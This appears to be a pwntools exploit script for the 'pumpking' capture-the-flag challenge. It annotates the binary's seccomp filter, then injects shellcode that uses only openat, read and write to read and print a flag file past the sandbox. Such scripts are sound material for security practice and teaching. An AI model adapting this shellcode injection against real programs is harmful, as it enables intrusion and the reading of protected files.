#!/usr/bin/python3
# @author: CryptoCat (https://github.com/Crypto-Cat/CTF/tree/main/pwn)
# Modified by An00bRektn
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
break king
n 30
'''.format(**locals())

# Binary filename
exe = './pumpking'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
"""
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
"""

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")

# Start program
io = start()
io.sendlineafter(':', 'pumpk1ngRulez')

# https://ctftime.org/writeup/33232

shellcode = shellcraft.linux.openat(-1, "/home/ctf/flag.txt")
shellcode += shellcraft.linux.read('rax', 'rsp', 80)
shellcode += shellcraft.linux.write(1, 'rsp', 80)
shellcode += shellcraft.linux.sigreturn()

payload = asm(shellcode)

# Send the payload
io.sendlineafter(b'>>', payload)
flag = io.recvlineS()
print(flag)
